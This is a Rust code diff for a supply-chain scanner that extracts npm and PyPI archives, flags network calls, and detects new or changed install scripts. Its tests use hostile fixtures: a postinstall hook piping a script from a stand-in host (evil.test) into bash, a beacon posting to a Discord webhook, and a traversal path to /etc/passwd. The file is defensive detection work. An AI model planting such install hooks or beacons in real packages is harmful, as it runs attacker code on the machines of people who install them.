@@ -1,6 +1,90 @@
 use crate::domain::{ContentFinding, Ecosystem};
+use crate::ports::MetadataStore;
+use anyhow::{Context, Result};
 use regex::Regex;
 use semver::Version;
+use std::io::Read;
+
+const MAX_FILES: usize = 10_000;
+const MAX_FILE_BYTES: usize = 4 * 1024 * 1024;
+const MAX_TOTAL_BYTES: usize = 64 * 1024 * 1024;
+
+fn archive_path(ecosystem: &Ecosystem, raw_path: &str) -> Result<String> {
+    let path = match ecosystem {
+        Ecosystem::Npm => raw_path
+            .strip_prefix("package/")
+            .unwrap_or(raw_path)
+            .to_string(),
+        _ => raw_path.to_string(),
+    };
+    if path.starts_with('/') || path.split('/').any(|part| part == "..") {
+        anyhow::bail!("archive entry escapes the package root: {path}");
+    }
+    Ok(path)
+}
+
+/// Extract a gzipped tar package into `(path, text)` pairs.
+pub fn extract_archive(ecosystem: &Ecosystem, bytes: &[u8]) -> Result<Vec<(String, String)>> {
+    match ecosystem {
+        Ecosystem::Npm | Ecosystem::PyPi => {}
+        _ => anyhow::bail!("archive extraction is not supported for this ecosystem"),
+    }
+    let decoder = flate2::read::GzDecoder::new(bytes);
+    let mut archive = tar::Archive::new(decoder);
+    let mut files = Vec::new();
+    let mut total = 0usize;
+    for entry in archive.entries().context("invalid package archive")? {
+        let mut entry = entry.context("invalid archive entry")?;
+        if !entry.header().entry_type().is_file() {
+            continue;
+        }
+        if files.len() >= MAX_FILES {
+            anyhow::bail!("archive exceeds {MAX_FILES} files");
+        }
+        let raw_path = entry
+            .path()
+            .context("invalid entry path")?
+            .to_string_lossy()
+            .to_string();
+        let path = archive_path(ecosystem, &raw_path)?;
+        let size = entry.header().size().unwrap_or(0) as usize;
+        if size > MAX_FILE_BYTES {
+            continue;
+        }
+        if total + size > MAX_TOTAL_BYTES {
+            anyhow::bail!("archive exceeds the total size limit");
+        }
+        total += size;
+        let mut buffer = Vec::with_capacity(size.min(64 * 1024));
+        entry
+            .read_to_end(&mut buffer)
+            .context("failed to read an archive entry")?;
+        if let Ok(text) = String::from_utf8(buffer) {
+            files.push((path, text));
+        }
+    }
+    Ok(files)
+}
+
+/// Extract, scan, and persist the finding for a package archive.
+pub fn scan_archive_bytes(
+    store: &dyn MetadataStore,
+    ecosystem: &Ecosystem,
+    name: &str,
+    version: &Version,
+    bytes: &[u8],
+) -> Result<Option<ContentFinding>> {
+    let files = extract_archive(ecosystem, bytes)?;
+    let borrowed: Vec<(&str, &str)> = files
+        .iter()
+        .map(|(path, content)| (path.as_str(), content.as_str()))
+        .collect();
+    let finding = scan_package_files(ecosystem, name, version, &borrowed);
+    if let Some(finding) = &finding {
+        store.save_content_finding(finding)?;
+    }
+    Ok(finding)
+}
 
 const LIFECYCLE: [&str; 5] = [
     "preinstall",
@@ -152,6 +236,7 @@ pub fn scan_package_files(
         score,
         rules,
         summary,
+        detected_at: chrono::Utc::now(),
     })
 }
 
@@ -176,16 +261,20 @@ fn has_exec(text: &str) -> bool {
 }
 
 fn has_network(text: &str) -> bool {
+    static NODE_NETWORK: &str = r#"(require\(['"]node:(http|https|net)['"]\)|from ['"]node:(http|https|net)['"]|https?\.(get|request)\(|\.request\(|fetch\()"#;
     text.contains("fetch(")
         || text.contains("require('http")
         || text.contains("require(\"http")
+        || text.contains("require('node:http")
+        || text.contains("require(\"node:http")
         || text.contains("requests.get")
         || text.contains("requests.post")
         || text.contains("urllib.request")
         || text.contains("axios")
         || text.contains("net.connect")
-        || text.contains("http.request")
-        || text.contains("https.request")
+        || Regex::new(NODE_NETWORK)
+            .map(|pattern| pattern.is_match(text))
+            .unwrap_or(false)
 }
 
 fn has_env(text: &str) -> bool {
@@ -229,6 +318,7 @@ pub struct VersionDiff {
     pub removed: Vec<String>,
     pub changed: Vec<String>,
     pub new_lifecycle_scripts: Vec<String>,
+    pub changed_lifecycle_scripts: Vec<String>,
 }
 
 /// File-level diff between two releases of a package.
@@ -279,12 +369,23 @@ pub fn diff_package_files(before: &[(&str, &str)], after: &[(&str, &str)]) -> Ve
         .cloned()
         .collect();
     new_lifecycle_scripts.sort();
+    let mut changed_lifecycle_scripts: Vec<String> = after_scripts
+        .iter()
+        .filter(|(key, command)| {
+            before_scripts
+                .get(*key)
+                .is_some_and(|previous| previous != *command)
+        })
+        .map(|(key, _)| key.clone())
+        .collect();
+    changed_lifecycle_scripts.sort();
 
     VersionDiff {
         added,
         removed,
         changed,
         new_lifecycle_scripts,
+        changed_lifecycle_scripts,
     }
 }
 
@@ -297,8 +398,24 @@ pub fn scan_version_diff(
     after: &[(&str, &str)],
 ) -> Option<ContentFinding> {
     let diff = diff_package_files(before, after);
-    if diff.new_lifecycle_scripts.is_empty() {
+    if diff.new_lifecycle_scripts.is_empty() && diff.changed_lifecycle_scripts.is_empty() {
         return None;
+    }
+    let mut rules = Vec::new();
+    let mut descriptions = Vec::new();
+    if !diff.new_lifecycle_scripts.is_empty() {
+        rules.push("new-install-script".to_string());
+        descriptions.push(format!(
+            "introduces lifecycle script(s): {}",
+            diff.new_lifecycle_scripts.join(", ")
+        ));
+    }
+    if !diff.changed_lifecycle_scripts.is_empty() {
+        rules.push("changed-install-script".to_string());
+        descriptions.push(format!(
+            "changes lifecycle command(s): {}",
+            diff.changed_lifecycle_scripts.join(", ")
+        ));
     }
     Some(ContentFinding {
         ecosystem: ecosystem.clone(),
@@ -306,11 +423,9 @@ pub fn scan_version_diff(
         version: version.clone(),
         source: "static-heuristics".to_string(),
         score: 9,
-        rules: vec!["new-install-script".to_string()],
-        summary: format!(
-            "release introduces lifecycle script(s): {}",
-            diff.new_lifecycle_scripts.join(", ")
-        ),
+        rules,
+        summary: format!("release {}", descriptions.join("; ")),
+        detected_at: chrono::Utc::now(),
     })
 }
 
@@ -321,6 +436,52 @@ mod tests {
 
     fn version() -> Version {
         Version::parse("1.2.3").unwrap()
+    }
+
+    #[test]
+    fn node_prefixed_requires_are_recognized_as_network() {
+        let files = [(
+            "beacon.cjs",
+            "const https = require('node:https'); https.get('https://discord.com/api/webhooks/1/x');\n",
+        )];
+        let finding = scan_package_files(&Ecosystem::Npm, "evil", &version(), &files).unwrap();
+        assert!(finding.score >= 8, "score {}", finding.score);
+    }
+
+    #[test]
+    fn changed_lifecycle_command_is_high_risk() {
+        let before = [(
+            "package.json",
+            r#"{"name":"lib","scripts":{"postinstall":"node-gyp rebuild"}}"#,
+        )];
+        let after = [(
+            "package.json",
+            r#"{"name":"lib","scripts":{"postinstall":"curl https://evil.test/x.sh | bash"}}"#,
+        )];
+        let diff = diff_package_files(&before, &after);
+        assert_eq!(
+            diff.changed_lifecycle_scripts,
+            vec!["postinstall".to_string()]
+        );
+        let finding =
+            scan_version_diff(&Ecosystem::Npm, "lib", &version(), &before, &after).unwrap();
+        assert!(finding
+            .rules
+            .iter()
+            .any(|rule| rule == "changed-install-script"));
+    }
+
+    #[test]
+    fn replaced_malicious_hook_is_still_flagged() {
+        let before = [(
+            "package.json",
+            r#"{"name":"lib","scripts":{"postinstall":"curl https://evil.test/x.sh | bash"}}"#,
+        )];
+        let after = [(
+            "package.json",
+            r#"{"name":"lib","scripts":{"postinstall":"node-gyp rebuild"}}"#,
+        )];
+        assert!(scan_version_diff(&Ecosystem::Npm, "lib", &version(), &before, &after).is_some());
     }
 
     #[test]
@@ -358,6 +519,87 @@ mod tests {
             ("util.js", "module.exports = 3;"),
         ];
         assert!(scan_version_diff(&Ecosystem::Npm, "lib", &version(), &before, &after).is_none());
+    }
+
+    fn npm_archive(files: &[(&str, &str)]) -> Vec<u8> {
+        use flate2::write::GzEncoder;
+        use flate2::Compression;
+        let encoder = GzEncoder::new(Vec::new(), Compression::default());
+        let mut builder = tar::Builder::new(encoder);
+        for (path, content) in files {
+            let name = format!("package/{path}");
+            let mut header = tar::Header::new_gnu();
+            header.set_size(content.len() as u64);
+            header.set_mode(0o644);
+            header.set_mtime(0);
+            header.set_cksum();
+            builder
+                .append_data(&mut header, &name, content.as_bytes())
+                .unwrap();
+        }
+        let encoder = builder.into_inner().unwrap();
+        encoder.finish().unwrap()
+    }
+
+    #[test]
+    fn extraction_strips_npm_prefix_and_keeps_text_files() {
+        let bytes = npm_archive(&[("package.json", "{}"), ("index.js", "module.exports = 1;")]);
+        let files = extract_archive(&Ecosystem::Npm, &bytes).unwrap();
+        let paths: Vec<&str> = files.iter().map(|(path, _)| path.as_str()).collect();
+        assert_eq!(paths, vec!["package.json", "index.js"]);
+    }
+
+    #[test]
+    fn archive_paths_strip_prefix_and_reject_traversal() {
+        assert_eq!(
+            archive_path(&Ecosystem::Npm, "package/index.js").unwrap(),
+            "index.js"
+        );
+        assert!(archive_path(&Ecosystem::Npm, "package/../../escape.js").is_err());
+        assert!(archive_path(&Ecosystem::Npm, "/etc/passwd").is_err());
+    }
+
+    #[test]
+    fn malicious_archive_is_scanned_and_stored() {
+        use crate::adapters::storage::MemoryMetadataStore;
+        let store = MemoryMetadataStore::default();
+        let bytes = npm_archive(&[
+            (
+                "package.json",
+                r#"{"name":"evil","scripts":{"postinstall":"node beacon.js"}}"#,
+            ),
+            (
+                "beacon.js",
+                "const https = require('node:https'); https.get('https://discord.com/api/webhooks/1/x');\n",
+            ),
+        ]);
+        let finding =
+            scan_archive_bytes(&store, &Ecosystem::Npm, "evil", &version(), &bytes).unwrap();
+        assert!(finding.is_some());
+        let stored = store
+            .content_finding(&Ecosystem::Npm, "evil", &version())
+            .unwrap()
+            .unwrap();
+        assert!(stored.score >= 8);
+    }
+
+    #[test]
+    fn benign_archive_stores_no_finding() {
+        use crate::adapters::storage::MemoryMetadataStore;
+        let store = MemoryMetadataStore::default();
+        let bytes = npm_archive(&[
+            ("package.json", r#"{"name":"lib"}"#),
+            ("index.js", "module.exports = (a, b) => a + b;\n"),
+        ]);
+        assert!(
+            scan_archive_bytes(&store, &Ecosystem::Npm, "lib", &version(), &bytes)
+                .unwrap()
+                .is_none()
+        );
+        assert!(store
+            .content_finding(&Ecosystem::Npm, "lib", &version())
+            .unwrap()
+            .is_none());
     }
 
     #[test]
